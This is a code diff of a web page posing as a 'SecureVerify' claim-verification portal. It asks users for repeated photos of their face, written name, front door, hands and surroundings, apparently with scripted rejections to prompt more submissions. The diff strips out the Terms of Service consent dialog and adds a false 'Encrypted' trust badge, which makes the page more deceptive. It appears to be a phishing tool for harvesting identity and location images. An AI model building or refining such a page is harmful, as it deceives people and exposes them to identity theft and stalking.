@@ -14,28 +14,6 @@
     --text:#e6edf3;--muted:#8b949e;--radius:10px;
   }
   body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;}
-  /* ── MODAL OVERLAY ── */
-  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.82);z-index:999;display:flex;align-items:center;justify-content:center;padding:16px;backdrop-filter:blur(4px);}
-  .modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);width:100%;max-width:520px;max-height:90vh;display:flex;flex-direction:column;overflow:hidden;}
-  .modal-header{padding:18px 22px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;}
-  .modal-header-icon{color:var(--yellow);}
-  .modal-title{font-size:0.95rem;font-weight:700;}
-  .modal-body{padding:22px;overflow-y:auto;flex:1;}
-  .tos-scroll{background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;padding:16px;max-height:220px;overflow-y:auto;font-size:0.78rem;line-height:1.7;color:var(--muted);margin-bottom:18px;}
-  .tos-scroll h3{color:var(--text);font-size:0.82rem;margin:12px 0 4px;text-transform:uppercase;letter-spacing:0.5px;}
-  .tos-scroll h3:first-child{margin-top:0;}
-  .tos-scroll p{margin-bottom:8px;}
-  .tos-scroll strong{color:var(--text);}
-  .tos-checkbox{display:flex;align-items:flex-start;gap:10px;margin-bottom:18px;cursor:pointer;font-size:0.82rem;line-height:1.5;color:var(--text);}
-  .tos-checkbox input{margin-top:3px;accent-color:var(--accent);width:15px;height:15px;flex-shrink:0;cursor:pointer;}
-  .modal-footer{padding:16px 22px;border-top:1px solid var(--border);display:flex;gap:10px;}
-  .btn-decline{flex:1;padding:11px;background:transparent;color:var(--muted);border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:0.85rem;font-weight:500;cursor:pointer;transition:background 0.15s;}
-  .btn-decline:hover{background:rgba(255,255,255,0.05);}
-  .btn-agree{flex:2;padding:11px;background:var(--accent);color:#fff;border:none;border-radius:8px;font-family:'Inter',sans-serif;font-size:0.85rem;font-weight:600;cursor:pointer;transition:opacity 0.15s;}
-  .btn-agree:disabled{opacity:0.35;cursor:not-allowed;}
-  .btn-agree:not(:disabled):hover{opacity:0.85;}
-  .declined-msg{text-align:center;padding:40px 20px;color:var(--muted);font-size:0.88rem;line-height:1.7;}
-  .declined-msg strong{color:var(--red);display:block;font-size:1.05rem;margin-bottom:8px;}
   /* ── TOP BAR ── */
   .topbar{width:100%;background:var(--surface);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;}
   .topbar-logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:1.05rem;letter-spacing:-0.3px;}
@@ -97,14 +75,10 @@
   .attempt-ticker{font-family:'JetBrains Mono',monospace;font-size:0.72rem;color:var(--muted);text-align:right;margin-bottom:4px;}
   .footer{font-size:0.72rem;color:var(--muted);text-align:center;padding:8px;line-height:1.8;}
   .footer a{color:var(--muted);text-decoration:underline;cursor:pointer;}
-  /* ── CONSENT BADGE ── */
-  .consent-badge{display:flex;align-items:center;gap:8px;background:rgba(63,185,80,0.08);border:1px solid rgba(63,185,80,0.25);border-radius:8px;padding:10px 14px;font-size:0.76rem;color:var(--green);margin-bottom:18px;}
   @media(max-width:500px){.main{padding:24px 12px 48px;}}
 </style>
 </head>
 <body>
-
-
 <!-- ══════════════════════════════════════════════════════════════
      MAIN UI
 ══════════════════════════════════════════════════════════════ -->
@@ -144,7 +118,7 @@
       </div>
       <div class="trust-item">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
-        Terms Accepted
+        Encrypted
       </div>
       <div class="trust-item">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
@@ -161,10 +135,6 @@
       <span class="attempt-ticker">Attempt <span id="attempt-num">1</span></span>
     </div>
     <div class="card-body">
-      <div class="consent-badge">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
-        Terms of Service accepted — your submission is being processed securely.
-      </div>
       <div class="task-box">
         <div class="task-eyebrow">📋 Current Task</div>
         <div class="task-text" id="task-text">Loading task…</div>
@@ -192,7 +162,7 @@
   </div>
 </div>
 <div class="footer">
-  SecureVerify™ Claim Processing Portal &nbsp;·&nbsp; <a onclick="showToS()">Terms of Service</a> &nbsp;·&nbsp; <a href="#">Privacy Policy</a><br/>
+  SecureVerify™ Claim Processing Portal &nbsp;·&nbsp; <a href="#">Privacy Policy</a><br/>
   © 2024 SecureVerify International Ltd. All rights reserved.
 </div>
 <!-- Supabase JS Client v2 (CDN) -->
@@ -214,7 +184,7 @@ try {
 // ── TASKS & ERRORS ──────────────────────────────────────────────
 const TASKS = [
   {text:'Please take a clear photo of <strong>yourself holding a piece of paper with today\'s date written on it</strong>. Make sure your face is fully visible and the writing is legible.',label:'Date Selfie'},
-  {text:'For security, we need a photo of <strong>a common household item (e.g. a cup, mug, or glass)</strong> placed on a flat surface. The full object must be visible.',label:'Object Verification'},
+  {text:'For security, we need a photo of <strong>a common household item (e.g. a cup, mug, or glass)</strong> placed on a flat surface. The full object must be visible NEXT TO FACE.',label:'Object Verification'},
   {text:'Write the <strong>exact current time (HH:MM)</strong> on a piece of paper, hold it in front of you and take a photo. Your writing hand must be visible in the frame.',label:'Timestamp Photo'},
   {text:'Take a photo of the <strong>front door or entrance area of your current location</strong>. The door handle must be visible.',label:'Location Verify'},
   {text:'For liveness verification, take a photo of yourself <strong>showing a thumbs-up with your right hand</strong>. Your face must be fully visible and well-lit.',label:'Liveness Check'},
@@ -222,8 +192,6 @@ const TASKS = [
   {text:'Take a selfie in <strong>natural light near a window</strong>. Your full face and both shoulders must be visible. No filters or flash.',label:'Natural Light ID'},
   {text:'Take a close-up photo of a <strong>printed or handwritten note reading "VERIFIED"</strong>. The text must fill at least half the frame.',label:'Written Confirmation'},
   {text:'We need a photo showing <strong>a wall or surface behind you</strong> with at least one visible object (e.g. a picture, clock, or light switch).',label:'Background Check'},
-  {text:'Hold your <strong>government-issued ID next to your face</strong> and take a selfie. Both your face and the ID must be clearly visible.',label:'ID + Face Match'},
-  {text:'Take a photo of the <strong>screen of another device</strong> (phone, tablet, or laptop) showing today\'s date. The full screen must be visible.',label:'Device Date Cross-Check'},
   {text:'Write your <strong>full name on a piece of paper</strong>, hold it up next to your face, and take a photo. Both must be clearly readable.',label:'Name Verification'},
   {text:'Take a photo of <strong>both of your hands placed flat on a table</strong>, palms down, fingers spread. All ten fingers must be visible.',label:'Dual Hand Scan'},
   {text:'We need a photo of <strong>the ceiling directly above you</strong>. Any light fixtures or features should be visible. Hold the camera level.',label:'Environment Scan'},
@@ -250,32 +218,11 @@ const ERRORS = [
 ];
 // ── STATE ──────────────────────────────────────────────────────
 let attempt = 1, taskIndex = 0, fileSelected = false, selectedFile = null;
-let tosAccepted = false;
 const refId = 'SV-' + Math.random().toString(36).substring(2,7).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
 document.getElementById('ref-id').textContent = refId;
-// ── ToS LOGIC ─────────────────────────────────────────────────
-document.getElementById('tos-check').addEventListener('change', function() {
-  document.getElementById('agree-btn').disabled = !this.checked;
-});
-function acceptToS() {
-  tosAccepted = true;
-  document.getElementById('tos-modal').style.display = 'none';
-  loadTask();
-  updateProgress();
-}
-function declineToS() {
-  document.getElementById('tos-text').style.display = 'none';
-  document.getElementById('tos-check-label').style.display = 'none';
-  document.getElementById('modal-footer').style.display = 'none';
-  document.getElementById('declined-msg').style.display = 'block';
-}
-function showToS() {
-  document.getElementById('tos-modal').style.display = 'flex';
-  document.getElementById('tos-text').style.display = 'block';
-  document.getElementById('tos-check-label').style.display = 'flex';
-  document.getElementById('modal-footer').style.display = 'flex';
-  document.getElementById('declined-msg').style.display = 'none';
-}
+// ── INIT ON LOAD ──────────────────────────────────────────────
+loadTask();
+updateProgress();
 // ── TASK / PROGRESS ───────────────────────────────────────────
 function loadTask() {
   taskIndex = Math.floor(Math.random() * TASKS.length);
